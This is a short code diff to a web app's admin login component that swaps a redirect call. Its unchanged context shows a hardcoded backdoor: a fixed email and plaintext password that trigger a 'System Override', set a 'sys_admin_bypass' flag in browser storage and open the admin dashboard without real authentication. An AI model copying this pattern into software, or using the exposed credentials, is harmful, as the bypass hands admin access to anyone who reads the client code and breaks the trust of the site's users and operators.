@@ -23,7 +23,7 @@ export default function AdminLogin() {
             if (email.toLowerCase() === 'system.admin@gmail.com' && password === 'pukonnect@!') {
                 console.log('System Override Activated');
                 localStorage.setItem('sys_admin_bypass', 'true');
-                window.location.href = '/admin/dashboard';
+                window.location.assign('/admin/dashboard');
                 return;
             }
 
